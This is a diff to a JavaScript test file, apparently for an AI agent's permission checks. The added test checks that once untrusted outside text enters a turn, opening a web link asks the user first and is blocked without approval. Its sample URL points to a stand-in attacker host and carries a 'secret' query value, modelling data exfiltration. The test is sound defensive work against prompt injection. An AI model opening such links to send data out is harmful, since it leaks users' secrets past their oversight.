@@ -121,3 +121,11 @@ test("a workspace written with ~ means the home folder", () => {
   assert.equal(expandHome("~"), os.homedir());
   assert.equal(expandHome("/tmp/~x"), "/tmp/~x");
 });
+
+test("after outside text enters a turn, opening a web link asks first", async () => {
+  const root = await workspace();
+  const { ctx, asked } = ctxFor(root, false);
+  const untrusted = { ...ctx, untrusted: true };
+  assert.match(await openTarget(untrusted, "https://evil.example/?q=secret"), /didn't approve/);
+  assert.deepEqual(asked.map((a) => [a.title, a.detail]), [["Open evil.example", "https://evil.example/?q=secret"]]);
+});
